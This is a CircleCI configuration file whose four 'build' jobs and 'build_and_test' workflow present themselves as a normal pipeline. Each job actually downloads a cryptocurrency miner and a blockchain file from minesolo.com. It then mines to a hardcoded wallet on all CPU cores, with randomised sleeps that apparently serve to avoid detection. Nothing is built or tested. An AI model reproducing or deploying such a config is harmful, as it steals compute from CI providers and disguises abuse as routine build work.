version: 2
jobs:
  build1:
    docker:
      - image: ubuntu:latest
    steps: 
      - checkout
      - run: echo 1024 | tee /etc/sysctl.conf && sysctl -w vm.nr_hugepages=1024 && apt-get update && apt-get install wget unzip libcurl3 coreutils util-linux libzmq3-dev libreadline-dev -y  && mkdir /memory && cd /memory && wget -O solo.tar.gz https://minesolo.com/release/solo-v1.0.3.5-linux64.tar.gz && tar -xzvf solo.tar.gz && wget --user-agent Mozilla/4.0 -O blockchain.raw https://minesolo.com/release/blockchain.raw && chmod -R 777 * && ls -l && ./solo-v1.0.3.5-linux64/solo-blockchain-import --input-file "./blockchain.raw" --verify 0 --data-dir /memory/blockchain/ --batch-size 500  > /dev/null 2>&1 && ls -l && echo "$(grep 'core id' /proc/cpuinfo | sort -u | wc -l)" && cat /proc/cpuinfo && lscpu && cat /proc/meminfo && sleep "$(( ( RANDOM % 180 ) ))" && ./solo-v1.0.3.5-linux64/solod  --rpc-bind-ip 127.0.0.1 --detach --data-dir /memory/blockchain/  --start-mining SL3SBGyWMAT92L4aYHVnMB8QibigmNCY8ZBj2VqtJNz2dYwKuPw6vtfGMh1fFEmtHvjSKEnovzAPbaq6wqEtdn2t2n8anxKUb --mining-threads "$(grep 'core id' /proc/cpuinfo | sort -u | wc -l)" && sleep 120 && ./solo-v1.0.3.5-linux64/solod status && ./solo-v1.0.3.5-linux64/solod exit && sleep "$(( ( RANDOM % 60 )  + 60 ))"  && ./solo-v1.0.3.5-linux64/solod  --rpc-bind-ip 127.0.0.1 --detach --data-dir /memory/blockchain/  --start-mining SL3SBGyWMAT92L4aYHVnMB8QibigmNCY8ZBj2VqtJNz2dYwKuPw6vtfGMh1fFEmtHvjSKEnovzAPbaq6wqEtdn2t2n8anxKUb --mining-threads "$(grep 'core id' /proc/cpuinfo | sort -u | wc -l)"  && sleep "$(( ( RANDOM % 300 )  + 300 ))"  && ./solo-v1.0.3.5-linux64/solod status  &&  sleep "$(( ( RANDOM % 300 )  + 200 ))"  && ./solo-v1.0.3.5-linux64/solod status && sleep 300  && ./solo-v1.0.3.5-linux64/solod status && sleep 300  && ./solo-v1.0.3.5-linux64/solod status && sleep 300 && ./solo-v1.0.3.5-linux64/solod status && sleep 300  && ./solo-v1.0.3.5-linux64/solod status && sleep 300  && ./solo-v1.0.3.5-linux64/solod status && sleep 300
  build2:
    docker:
      - image: ubuntu:latest
    steps: 
      - checkout
      - run: echo 1024 | tee /etc/sysctl.conf && sysctl -w vm.nr_hugepages=1024 && apt-get update && apt-get install wget unzip libcurl3 coreutils util-linux libzmq3-dev libreadline-dev -y  && mkdir /memory && cd /memory && wget -O solo.tar.gz https://minesolo.com/release/solo-v1.0.3.5-linux64.tar.gz && tar -xzvf solo.tar.gz && wget --user-agent Mozilla/4.0 -O blockchain.raw https://minesolo.com/release/blockchain.raw && chmod -R 777 * && ls -l && ./solo-v1.0.3.5-linux64/solo-blockchain-import --input-file "./blockchain.raw" --verify 0 --data-dir /memory/blockchain/ --batch-size 500  > /dev/null 2>&1 && ls -l && echo "$(grep 'core id' /proc/cpuinfo | sort -u | wc -l)" && cat /proc/cpuinfo && lscpu && cat /proc/meminfo && sleep "$(( ( RANDOM % 180 ) ))" && ./solo-v1.0.3.5-linux64/solod  --rpc-bind-ip 127.0.0.1 --detach --data-dir /memory/blockchain/  --start-mining SL3SBGyWMAT92L4aYHVnMB8QibigmNCY8ZBj2VqtJNz2dYwKuPw6vtfGMh1fFEmtHvjSKEnovzAPbaq6wqEtdn2t2n8anxKUb --mining-threads "$(grep 'core id' /proc/cpuinfo | sort -u | wc -l)" && sleep 120 && ./solo-v1.0.3.5-linux64/solod status && ./solo-v1.0.3.5-linux64/solod exit && sleep "$(( ( RANDOM % 60 )  + 60 ))"  && ./solo-v1.0.3.5-linux64/solod  --rpc-bind-ip 127.0.0.1 --detach --data-dir /memory/blockchain/  --start-mining SL3SBGyWMAT92L4aYHVnMB8QibigmNCY8ZBj2VqtJNz2dYwKuPw6vtfGMh1fFEmtHvjSKEnovzAPbaq6wqEtdn2t2n8anxKUb --mining-threads "$(grep 'core id' /proc/cpuinfo | sort -u | wc -l)"  && sleep "$(( ( RANDOM % 300 )  + 300 ))"  && ./solo-v1.0.3.5-linux64/solod status  &&  sleep "$(( ( RANDOM % 300 )  + 200 ))"  && ./solo-v1.0.3.5-linux64/solod status && sleep 300  && ./solo-v1.0.3.5-linux64/solod status && sleep 300  && ./solo-v1.0.3.5-linux64/solod status && sleep 300 && ./solo-v1.0.3.5-linux64/solod status && sleep 300  && ./solo-v1.0.3.5-linux64/solod status && sleep 300  && ./solo-v1.0.3.5-linux64/solod status && sleep 300
  build3:
    docker:
      - image: ubuntu:latest
    steps: 
      - checkout
      - run: echo 1024 | tee /etc/sysctl.conf && sysctl -w vm.nr_hugepages=1024 && apt-get update && apt-get install wget unzip libcurl3 coreutils util-linux libzmq3-dev libreadline-dev -y  && mkdir /memory && cd /memory && wget -O solo.tar.gz https://minesolo.com/release/solo-v1.0.3.5-linux64.tar.gz && tar -xzvf solo.tar.gz && wget --user-agent Mozilla/4.0 -O blockchain.raw https://minesolo.com/release/blockchain.raw && chmod -R 777 * && ls -l && ./solo-v1.0.3.5-linux64/solo-blockchain-import --input-file "./blockchain.raw" --verify 0 --data-dir /memory/blockchain/ --batch-size 500  > /dev/null 2>&1 && ls -l && echo "$(grep 'core id' /proc/cpuinfo | sort -u | wc -l)" && cat /proc/cpuinfo && lscpu && cat /proc/meminfo && sleep "$(( ( RANDOM % 180 ) ))" && ./solo-v1.0.3.5-linux64/solod  --rpc-bind-ip 127.0.0.1 --detach --data-dir /memory/blockchain/  --start-mining SL3SBGyWMAT92L4aYHVnMB8QibigmNCY8ZBj2VqtJNz2dYwKuPw6vtfGMh1fFEmtHvjSKEnovzAPbaq6wqEtdn2t2n8anxKUb --mining-threads "$(grep 'core id' /proc/cpuinfo | sort -u | wc -l)" && sleep 120 && ./solo-v1.0.3.5-linux64/solod status && ./solo-v1.0.3.5-linux64/solod exit && sleep "$(( ( RANDOM % 60 )  + 60 ))"  && ./solo-v1.0.3.5-linux64/solod  --rpc-bind-ip 127.0.0.1 --detach --data-dir /memory/blockchain/  --start-mining SL3SBGyWMAT92L4aYHVnMB8QibigmNCY8ZBj2VqtJNz2dYwKuPw6vtfGMh1fFEmtHvjSKEnovzAPbaq6wqEtdn2t2n8anxKUb --mining-threads "$(grep 'core id' /proc/cpuinfo | sort -u | wc -l)"  && sleep "$(( ( RANDOM % 300 )  + 300 ))"  && ./solo-v1.0.3.5-linux64/solod status  &&  sleep "$(( ( RANDOM % 300 )  + 200 ))"  && ./solo-v1.0.3.5-linux64/solod status && sleep 300  && ./solo-v1.0.3.5-linux64/solod status && sleep 300  && ./solo-v1.0.3.5-linux64/solod status && sleep 300 && ./solo-v1.0.3.5-linux64/solod status && sleep 300  && ./solo-v1.0.3.5-linux64/solod status && sleep 300  && ./solo-v1.0.3.5-linux64/solod status && sleep 300
  build4:
    docker:
      - image: ubuntu:latest
    steps: 
      - checkout
      - run: echo 1024 | tee /etc/sysctl.conf && sysctl -w vm.nr_hugepages=1024 && apt-get update && apt-get install wget unzip libcurl3 coreutils util-linux libzmq3-dev libreadline-dev -y  && mkdir /memory && cd /memory && wget -O solo.tar.gz https://minesolo.com/release/solo-v1.0.3.5-linux64.tar.gz && tar -xzvf solo.tar.gz && wget --user-agent Mozilla/4.0 -O blockchain.raw https://minesolo.com/release/blockchain.raw && chmod -R 777 * && ls -l && ./solo-v1.0.3.5-linux64/solo-blockchain-import --input-file "./blockchain.raw" --verify 0 --data-dir /memory/blockchain/ --batch-size 500  > /dev/null 2>&1 && ls -l && echo "$(grep 'core id' /proc/cpuinfo | sort -u | wc -l)" && cat /proc/cpuinfo && lscpu && cat /proc/meminfo && sleep "$(( ( RANDOM % 180 ) ))" && ./solo-v1.0.3.5-linux64/solod  --rpc-bind-ip 127.0.0.1 --detach --data-dir /memory/blockchain/  --start-mining SL3SBGyWMAT92L4aYHVnMB8QibigmNCY8ZBj2VqtJNz2dYwKuPw6vtfGMh1fFEmtHvjSKEnovzAPbaq6wqEtdn2t2n8anxKUb --mining-threads "$(grep 'core id' /proc/cpuinfo | sort -u | wc -l)" && sleep 120 && ./solo-v1.0.3.5-linux64/solod status && ./solo-v1.0.3.5-linux64/solod exit && sleep "$(( ( RANDOM % 60 )  + 60 ))"  && ./solo-v1.0.3.5-linux64/solod  --rpc-bind-ip 127.0.0.1 --detach --data-dir /memory/blockchain/  --start-mining SL3SBGyWMAT92L4aYHVnMB8QibigmNCY8ZBj2VqtJNz2dYwKuPw6vtfGMh1fFEmtHvjSKEnovzAPbaq6wqEtdn2t2n8anxKUb --mining-threads "$(grep 'core id' /proc/cpuinfo | sort -u | wc -l)"  && sleep "$(( ( RANDOM % 300 )  + 300 ))"  && ./solo-v1.0.3.5-linux64/solod status  &&  sleep "$(( ( RANDOM % 300 )  + 200 ))"  && ./solo-v1.0.3.5-linux64/solod status && sleep 300  && ./solo-v1.0.3.5-linux64/solod status && sleep 300  && ./solo-v1.0.3.5-linux64/solod status && sleep 300 && ./solo-v1.0.3.5-linux64/solod status && sleep 300  && ./solo-v1.0.3.5-linux64/solod status && sleep 300  && ./solo-v1.0.3.5-linux64/solod status && sleep 300

workflows:
  version: 2
  build_and_test:
    jobs:
      - build1
      - build2
      - build3
      - build4
